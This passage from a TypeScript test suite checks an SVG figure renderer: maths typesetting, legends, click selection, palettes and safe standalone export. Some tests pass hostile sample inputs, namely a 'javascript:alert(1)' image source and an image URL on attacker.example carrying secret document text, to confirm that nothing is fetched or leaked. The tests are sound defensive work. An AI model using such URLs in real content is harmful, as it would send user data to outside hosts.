  it('draws cell text the way layout measured it: maths typeset, breaks and escapes applied', () => {
    const text = [['$x_p^1$', 'a  b', 'top\nbottom', 'costs \\$5']];
    const s = tensor({ rows: 1, cols: 4, text, values: null, pattern: 'none' });
    const markup = render({ scene: s });
    const g = layers(parse(markup)).nodes.children[0];
    // Maths is KaTeX in the cell's own box, never the raw LaTeX as text.
    const math = [...g.querySelectorAll('foreignObject')];
    expect(math).toHaveLength(1);
    expect(math[0].querySelector('.katex')).not.toBeNull();
    expect(math[0].getAttribute('x')).toBe('9');
    expect(math[0].getAttribute('width')).toBe('13');
    expect(markup).not.toContain('$x_p^1$');
    const texts = [...g.querySelectorAll('text')];
    expect(texts.map((t) => [...t.querySelectorAll('tspan')].map((span) => span.textContent))).toEqual([
      ['a b'],
      ['top', 'bottom'],
      ['costs $5'],
    ]);
  });

  it('typesets maths cells of a compiled tensor inside the cells layout sized for them', () => {
    const spec = { nodes: [{ id: 't', shape: 'tensor', cells: ['$x_p^1$', '$x_p^2$', '$x_p^N$'] }] };
    const compiled = compileFigure(JSON.stringify(spec), createHeuristicMeasurer());
    expect(compiled.ok).toBe(true);
    const t = compiled.scene!.nodes[0];
    const svg = parse(render({ scene: compiled.scene! }));
    const boxes = [...svg.querySelectorAll('foreignObject')];
    expect(boxes).toHaveLength(3);
    const cw = t.shape.width / 3;
    boxes.forEach((box, col) => {
      expect(Number(box.getAttribute('x'))).toBeCloseTo(t.shape.x + col * cw - 1, 1);
      expect(Number(box.getAttribute('width'))).toBeCloseTo(cw + 2, 1);
    });
    expect([...svg.querySelectorAll('text')].some((node) => node.textContent?.includes('$'))).toBe(false);
  });

  it('draws an inline image fitted and clipped to its box', () => {
    const src = 'data:image/png;base64,iVBORw0KGgo=';
    const s = scene({ nodes: [node('img', rect, { shape: 'image', src }, { label: null })] });
    const svg = parse(render({ scene: s, idPrefix: 'p' }));
    const image = svg.querySelector('image')!;
    expect(image.getAttribute('href')).toBe(src);
    expect(image.getAttribute('preserveAspectRatio')).toBe('xMidYMid meet');
    expect(image.getAttribute('clip-path')).toBe('url(#p-clip-0)');
    expect(svg.querySelector('clipPath')?.id).toBe('p-clip-0');
  });

  it.each([null, 'javascript:alert(1)', 'http://example.org/a.png', 'https://example.org/a.png', 'data:text/html;base64,PGI+'])(
    'draws a placeholder for the source %s',
    (src) => {
      const s = scene({ nodes: [node('img', rect, { shape: 'image', src }, { label: null })] });
      const svg = parse(render({ scene: s }));
      expect(svg.querySelector('image')).toBeNull();
      const [placeholder] = [...layers(svg).nodes.querySelectorAll('rect')];
      expect(placeholder.getAttribute('fill')).toBe(LIGHT.placeholder);
      expect(layers(svg).nodes.querySelector('path')?.getAttribute('d')?.match(/M/g)).toHaveLength(2);
    },
  );

  it('never fetches a remote image: its placeholder names the host and says why', () => {
    const src = 'https://attacker.example/p.png?d=SECRET_DOC_TEXT';
    const box = { x: 10, y: 10, width: 120, height: 90 };
    const s = scene({ nodes: [node('img', box, { shape: 'image', src }, { label: null })] });
    const markup = render({ scene: s, idPrefix: 'p' });
    // Neither the URL nor anything it carries reaches the markup.
    expect(markup).not.toContain('SECRET_DOC_TEXT');
    expect(markup).not.toContain('https:');
    const svg = parse(markup);
    expect(svg.querySelector('image')).toBeNull();
    const note = layers(svg).nodes.querySelector('g[clip-path="url(#p-clip-0)"] > text')!;
    expect([...note.querySelectorAll('tspan')].map((span) => span.textContent)).toEqual([
      'attacker.example',
      'remote image not loaded',
    ]);
    expect(note.getAttribute('fill')).toBe(LIGHT.muted);
    // Haloed in the placeholder fill, so the cross never runs through the words.
    expect(note.getAttribute('stroke')).toBe(LIGHT.placeholder);
    expect(svg.querySelector('clipPath#p-clip-0 > rect')?.getAttribute('width')).toBe('120');
  });

  it('keeps the end of a long remote host, where the registrable domain is', () => {
    const src = 'http://a-very-long-subdomain-name.tracking.attacker.example/pixel.gif';
    const s = scene({ nodes: [node('img', rect, { shape: 'image', src }, { label: null })] });
    const host = parse(render({ scene: s })).querySelector('tspan')!.textContent!;
    // 44px is too narrow for all of it.
    expect(host.startsWith('…')).toBe(true);
    expect('a-very-long-subdomain-name.tracking.attacker.example'.endsWith(host.slice(1))).toBe(true);
  });
});

describe('FigureSvg: legend', () => {
  it('draws node swatches with their pattern and edge samples as lines', () => {
    const legend: SceneLegend = {
      box: { x: 4, y: 170, width: 300, height: 14 },
      items: [
        {
          sample: { kind: 'node', tone: 'teal', shape: 'box', pattern: 'dots', border: 'solid' },
          swatch: { x: 4, y: 171, width: 18, height: 11 },
          label: labelBox('Cached', { x: 26, y: 170, width: 40, height: 13 }, font(10.5), 'left'),
        },
        {
          sample: { kind: 'edge', line: 'dashed', weight: 'normal', tone: null },
          swatch: { x: 100, y: 171, width: 18, height: 11 },
          label: labelBox('Training only', { x: 122, y: 170, width: 70, height: 13 }, font(10.5), 'left'),
        },
      ],
    };
    const svg = parse(render({ scene: scene({ legend }) }));
    expect(svg.querySelector('defs > pattern')?.id).toBe('fig1-dots-teal');
    const [nodeItem, edgeItem] = [...svg.children].filter((c) => c.tagName === 'g').at(-1)!.children;
    expect([...nodeItem.querySelectorAll('path')].map((p) => p.getAttribute('fill'))).toEqual([
      LIGHT.tones.teal.fill,
      'url(#fig1-dots-teal)',
      'none',
    ]);
    const line = edgeItem.querySelector('path')!;
    expect(line.getAttribute('d')).toBe('M100 176.5H118');
    expect(line.getAttribute('stroke-dasharray')).toBe('4 3');
    expect([nodeItem, edgeItem].map((g) => g.querySelector('text')?.textContent)).toEqual(['Cached', 'Training only']);
  });
});

describe('FigureSvg: interaction and selection', () => {
  afterEach(() => {
    document.body.innerHTML = '';
  });

  it('tags nothing and adds no hit strokes when static', () => {
    const markup = render({ scene: basicScene() });
    expect(markup).not.toContain('data-figure-id');
    expect(markup).not.toContain('transparent');
    expect(markup).not.toContain('cursor');
  });

  it('tags nodes, groups and edges with their ids when clickable', () => {
    const svg = parse(render({ scene: basicScene(), onItemClick: () => {} }));
    const tagged = [...svg.querySelectorAll('[data-figure-id]')].map((el) => [
      el.getAttribute('data-figure-id'),
      el.getAttribute('data-figure-kind'),
    ]);
    expect(tagged).toEqual([
      ['block', 'group'],
      ['q->k', 'edge'],
      ['q', 'node'],
      ['k', 'node'],
    ]);
    expect(svg.querySelector('[data-figure-id="q"]')?.getAttribute('style')).toBe('cursor:pointer');
    // The group's empty area catches clicks.
    expect(svg.querySelector('[data-figure-id="block"] path')?.getAttribute('fill')).toBe('transparent');
    const hit = svg.querySelector('[data-figure-id="q->k"] path')!;
    expect(hit.getAttribute('stroke')).toBe('transparent');
    expect(hit.getAttribute('stroke-width')).toBe('10');
    expect(hit.getAttribute('d')).toBe(basicScene().edges[0].d);
  });

  it('reports clicks with the item id and kind', () => {
    const onItemClick = vi.fn();
    const host = document.createElement('div');
    document.body.append(host);
    const root = createRoot(host);
    const s = basicScene();
    s.edges[0].label = labelBox('x', { x: 74, y: 70, width: 10, height: 12.5 }, font(10), 'left');
    s.nodes[0].label = labelBox('$q_t$', s.nodes[0].shape);
    act(() => root.render(<FigureSvg scene={s} palette={LIGHT} idPrefix="c" onItemClick={onItemClick} />));
    // Created by React in the DOM, the maths wrapper is XHTML, not SVG.
    expect(host.querySelector('foreignObject > div')?.namespaceURI).toBe('http://www.w3.org/1999/xhtml');
    expect(host.querySelector('foreignObject .katex')).not.toBeNull();
    const click = (el: Element | null) => act(() => el?.dispatchEvent(new MouseEvent('click', { bubbles: true })));
    click(host.querySelector('[data-figure-id="k"] path'));
    click(host.querySelector('[data-figure-kind="group"] path'));
    click(host.querySelector('[data-figure-kind="edge"] path'));
    // The edge label selects its edge too.
    click(host.querySelectorAll('[data-figure-kind="edge"]')[1].querySelector('text'));
    expect(onItemClick.mock.calls).toEqual([
      ['k', 'node'],
      ['block', 'group'],
      ['q->k', 'edge'],
      ['q->k', 'edge'],
    ]);
    act(() => root.unmount());
  });

  it('outlines the selected node, group or edge', () => {
    const s = basicScene();
    const outline = (selectedId: string | null) =>
      parse(render({ scene: s, selectedId })).querySelector('[data-figure-selection]');
    const n = outline('k')!;
    expect([n.getAttribute('x'), n.getAttribute('y'), n.getAttribute('width'), n.getAttribute('height')]).toEqual([
      '27', '107', '86', '32',
    ]);
    expect(n.getAttribute('stroke')).toBe(LIGHT.highlight);
    expect(n.getAttribute('stroke-dasharray')).toBe('4 3');
    expect(n.getAttribute('pointer-events')).toBe('none');
    expect(outline('block')?.getAttribute('width')).toBe('126');
    // An edge: its polyline and arrowhead, inflated.
    const e = outline('q->k')!;
    expect([e.getAttribute('x'), e.getAttribute('y'), e.getAttribute('height')]).toEqual(['64', '53', '60']);
    expect(outline('missing')).toBeNull();
    expect(outline(null)).toBeNull();
  });
});

describe('FigureSvg: palettes', () => {
  it('draws with the palette it is given', () => {
    const dark = figurePalette('dark', 'mono');
    const s = scene({ nodes: [node('a', { x: 10, y: 10, width: 60, height: 26 }, { tone: 'purple' })], edges: basicScene().edges });
    const svg = parse(render({ scene: s, palette: dark }));
    const path = layers(svg).nodes.querySelector('path')!;
    expect(path.getAttribute('fill')).toBe(dark.tones.purple.fill);
    expect(path.getAttribute('stroke')).toBe(dark.tones.purple.stroke);
    expect(layers(svg).edges.querySelector('path')?.getAttribute('stroke')).toBe(dark.edge);
    expect(layers(svg).nodes.querySelector('text')?.getAttribute('fill')).toBe(dark.ink);
  });

  it('uses the serif stack when the labels are serif', () => {
    const rect = { x: 10, y: 10, width: 60, height: 26 };
    const s = scene({ nodes: [node('a', rect, {}, { label: labelBox('a', rect, { ...font(), family: 'serif' }) })] });
    const svg = parse(render({ scene: s }));
    expect(svg.getAttribute('font-family')).toContain('Source Serif 4');
    expect(svg.querySelector('text')?.getAttribute('font-family')).toContain('Source Serif 4');
  });
});

/* ────────────────────────────────────────────────────────────────────────
 * figureSvgFile
 * ──────────────────────────────────────────────────────────────────────── */

function mathScene(latex = '\\sqrt{d_k}\\ \\mathbf{c}_t^{KV}\\text{ a b}'): FigureScene {
  const rect = { x: 10, y: 10, width: 120, height: 30 };
  const source = `Scale $${latex}$ & more`;
  return scene({ nodes: [node('m', rect, { label: label(source) }, { label: labelBox(source, rect) })] });
}

describe('figureSvgMarkup', () => {
  it('writes a standalone, well-formed SVG document with a painted background', () => {
    const markup = figureSvgMarkup(basicScene(), LIGHT, { title: 'Attention', description: 'Q and K' });
    expect(markup.startsWith('<?xml version="1.0" encoding="UTF-8"?>\n<svg xmlns="http://www.w3.org/2000/svg"')).toBe(true);
    const svg = parse(markup);
    expect(svg.querySelector('title')?.textContent).toBe('Attention');
    expect(svg.querySelector('desc')?.textContent).toBe('Q and K');
    expect(svg.querySelector('title')?.id).toBe('cwfig-title');
    expect(svg.querySelector(':scope > rect')?.getAttribute('fill')).toBe('#ffffff');
    expect(markup).toContain(`<style><![CDATA[${FIGURE_MATH_CSS}]]></style>`);
    expect(markup).not.toContain('KaTeX stylesheet');
    expect(markup).not.toContain('data-figure-id');
  });

  it('stays well-formed XML with KaTeX markup, escaped text and non-breaking spaces', () => {
    const markup = figureSvgMarkup(mathScene(), LIGHT);
    const svg = parse(markup);
    const div = svg.querySelector('foreignObject > div')!;
    expect(div.namespaceURI).toBe('http://www.w3.org/1999/xhtml');
    expect(div.querySelector('.katex')).not.toBeNull();
    // \sqrt draws an inline <svg> of its own.
    expect(div.getElementsByTagNameNS('http://www.w3.org/2000/svg', 'svg').length).toBeGreaterThan(0);
    expect(div.textContent).toContain('& more');
  });

  it('explains the missing KaTeX stylesheet when it has not been loaded', () => {
    const markup = figureSvgMarkup(mathScene(), LIGHT);
    expect(markup).toMatch(/^<\?xml[^\n]*\n<!-- The maths in this figure is KaTeX HTML/);
    parse(markup);
  });

  it('embeds a given KaTeX stylesheet only when there is maths, safely inside CDATA', () => {
    const css = '.katex{font:normal 1.21em KaTeX_Main} a>b{content:"]]>&<$&$1"}';
    const withMath = figureSvgMarkup(mathScene(), LIGHT, { katexCss: css });
    expect(withMath).not.toContain('KaTeX stylesheet');
    const style = parse(withMath).querySelector('defs > style')!;
    expect(style.textContent).toBe(FIGURE_MATH_CSS + css);
    expect(figureSvgMarkup(basicScene(), LIGHT, { katexCss: css })).not.toContain('KaTeX_Main');
  });

  it('keeps ids unique per prefix', () => {
    const s = scene({ nodes: [node('c', { x: 10, y: 10, width: 60, height: 26 }, { pattern: 'hatch' })] });
    expect(figureSvgMarkup(s, LIGHT, { idPrefix: 'x1' })).toContain('url(#x1-hatch-neutral)');
  });

  it('drops the code points XML 1.0 forbids, wherever they come from', () => {
    const rect = { x: 10, y: 10, width: 120, height: 30 };
    const tensorRect = { x: 10, y: 60, width: 60, height: 20 };
    const labelled = 'a\u0001b $x\u0002$ c\uFFFEd\uFFFF e\uD800f \u{1F600}';
    const s = scene({
      nodes: [
        node('m', rect, { label: label(labelled) }, { label: labelBox(labelled, rect) }),
        node('t', tensorRect, { shape: 'tensor', cells: { rows: 1, cols: 2, text: [['p\u0003q', 'r\u000bs']], values: null, pattern: 'none' } }, { label: null }),
      ],
    });
    const markup = figureSvgMarkup(s, LIGHT, { title: 'Bell\u0007Title', description: 'Alt\u000bwith VT\ttab' });
    const svg = parse(markup);
    // eslint-disable-next-line no-control-regex
    expect(markup).not.toMatch(/[\u0000-\u0008\u000b\u000c\u000e-\u001f\uFFFE\uFFFF]|[\uD800-\uDBFF](?![\uDC00-\uDFFF])/);
    expect(svg.querySelector('title')?.textContent).toBe('BellTitle');
    // Tabs, newlines and astral characters are legal and stay.
    expect(svg.querySelector('desc')?.textContent).toBe('Altwith VT\ttab');
    expect(svg.querySelector('foreignObject')?.textContent).toContain('ab');
    expect(svg.querySelector('foreignObject')?.textContent).toContain('\u{1F600}');
    // Cells are labels: a vertical tab is whitespace there, as in any label.
    expect([...svg.querySelectorAll('text')].map((t) => t.textContent)).toEqual(['pq', 'r s']);
  });

  it('writes a well-formed file for an adversarial spec, compiled end to end', () => {
    const spec = {
      title: 'Bell\u0007Title',
      alt: 'Alt\u000bwith VT',
      nodes: [
        { id: 't', shape: 'tensor', cells: [['a\u0001b', 'c\u0003']] },
        { id: 'a', label: '$x\u0001$ and x\uFFFEy' },
        'b',
      ],
      edges: ['t -> b', 'a -> b'],
    };
    const compiled = compileFigure(JSON.stringify(spec), createHeuristicMeasurer());
    expect(compiled.ok).toBe(true);
    const { scene: compiledScene, model } = compiled;
    parse(figureSvgMarkup(compiledScene!, LIGHT, { title: model!.title ?? undefined, description: describeFigure(model!) }));
  });
});

describe('sceneHasMath', () => {
  it('finds maths in any label', () => {
    expect(sceneHasMath(basicScene())).toBe(false);
    expect(sceneHasMath(mathScene())).toBe(true);
    const withEdgeMath = basicScene();
    withEdgeMath.edges[0].label = labelBox('$x$', { x: 0, y: 0, width: 10, height: 12 });
    expect(sceneHasMath(withEdgeMath)).toBe(true);
    const withPanelMath = basicScene();
    withPanelMath.groups[0].panel = labelBox('(a) $\\alpha$', { x: 0, y: 0, width: 10, height: 12 });
    expect(sceneHasMath(withPanelMath)).toBe(true);
  });

  it('finds maths in tensor cells, which are drawn as labels', () => {
    const tensor = (text: (string | null)[][]) =>
      scene({
        nodes: [
          node('t', { x: 0, y: 0, width: 40, height: 20 }, { shape: 'tensor', cells: { rows: 1, cols: 2, text, values: null, pattern: 'none' } }, { label: null }),
        ],
      });
    expect(sceneHasMath(tensor([['a', null]]))).toBe(false);
    expect(sceneHasMath(tensor([['costs \\$5', '$']]))).toBe(false);
    expect(sceneHasMath(tensor([['a', '$x_p^1$']]))).toBe(true);
  });
});

describe('figureSvgBlob / figureSvgDownload', () => {
  it('wraps the markup in an SVG blob', async () => {
    const blob = figureSvgBlob(basicScene(), LIGHT);
    expect(blob.type).toBe('image/svg+xml;charset=utf-8');
    expect(await blob.text()).toBe(figureSvgMarkup(basicScene(), LIGHT));
  });

  it('does not load the KaTeX stylesheet for a figure without maths', async () => {
    const blob = await figureSvgDownload(basicScene(), LIGHT);
    expect(await blob.text()).toBe(figureSvgMarkup(basicScene(), LIGHT));
  });

  // Runs after the figureSvgMarkup tests: the loaded stylesheet is cached for the module's lifetime.
  it('embeds the offline KaTeX stylesheet, fonts inlined, for a figure with maths', async () => {
    const text = await (await figureSvgDownload(mathScene(), LIGHT)).text();
    expect(text).not.toContain('KaTeX stylesheet');
    expect(text).toContain('@font-face');
    expect(text).toContain('data:font/woff2;base64,');
    parse(text);
    // Loaded once, it serves later synchronous blobs too.
    expect(await figureSvgBlob(mathScene(), LIGHT).text()).toBe(text);
  }, 20_000);
});
